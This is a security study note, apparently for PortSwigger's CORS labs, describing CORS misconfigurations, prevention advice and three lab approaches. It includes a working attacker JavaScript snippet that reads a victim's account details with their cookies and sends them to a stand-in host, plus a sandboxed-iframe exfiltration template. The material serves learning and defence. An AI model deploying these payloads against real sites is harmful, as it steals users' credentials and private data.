---
tags: [hacking, web, portswigger, cors]
type: vulnerability-category
source: https://portswigger.net/web-security/cors
last-verified: 2026-08-25
---

# Cross-origin resource sharing (CORS)

## Up
- [[PortSwigger]]

## What it is
CORS is a browser mechanism that relaxes the same-origin policy so a site can read responses from another origin, controlled by response headers. The **same-origin policy** normally lets a page *send* cross-origin requests but blocks *reading* the response; CORS grants read access to origins the server trusts via `Access-Control-Allow-Origin` (ACAO). Misconfigurations turn this into a data-theft vector — especially with `Access-Control-Allow-Credentials: true`, which lets cross-origin requests carry the victim's cookies.

## Vulnerabilities

### Reflecting the Origin header
The worst misconfiguration: the server reflects whatever `Origin` the client sends and allows credentials.
```
Origin: https://malicious-website.com
→ Access-Control-Allow-Origin: https://malicious-website.com
  Access-Control-Allow-Credentials: true
```
Attacker JS steals the victim's data:
```javascript
var req = new XMLHttpRequest();
req.onload = function(){ location='//malicious-website.com/log?key='+this.responseText; };
req.open('get','https://vulnerable-website.com/accountDetails',true);
req.withCredentials = true;
req.send();
```

### Whitelist parsing errors
Sloppy matching: allowing anything *ending in* `normal-website.com` → register `hackersnormal-website.com`; allowing anything *starting with* it → `normal-website.com.evil.net`.

### Trusted `null` origin
Some apps whitelist `null`. Browsers send `Origin: null` from sandboxed iframes, `data:` URLs, and some redirects. Deliver the exfil script from a sandboxed iframe to get a `null` origin:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
 src="data:text/html,<script>/* credentialed fetch + exfil */</script>"></iframe>
```

### Chaining with XSS on a trusted subdomain
If a whitelisted subdomain has XSS, use it to make the credentialed CORS request and read parent-domain secrets (API keys).

### Breaking TLS
If an HTTPS site trusts an **HTTP** subdomain, a network attacker MITMs the HTTP origin, injects a CORS request to the HTTPS parent, and reads the response.

### Internal network CORS
Intranet apps with `Access-Control-Allow-Origin: *` (no credentials) can be probed by any external site through a victim's browser, since internal apps are often weakly protected.

## Prevention
- Specify trusted origins **explicitly**; never reflect the `Origin` header.
- Only whitelist genuinely trusted origins; validate with exact matching.
- **Never** whitelist `null`; avoid wildcard ACAO on internal apps.
- Don't rely on CORS for security — protect sensitive data with proper auth/authorization server-side.

## Labs
3 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| CORS vulnerability with basic origin reflection | Apprentice | Reflected ACAO + credentials; fetch `/accountDetails` and exfil the API key. | |
| CORS vulnerability with trusted null origin | Apprentice | Send the credentialed request from a sandboxed iframe (`Origin: null`). | |
| CORS vulnerability with trusted insecure protocols | Practitioner | Exploit a trusted HTTP subdomain (XSS) to make the credentialed request. | |
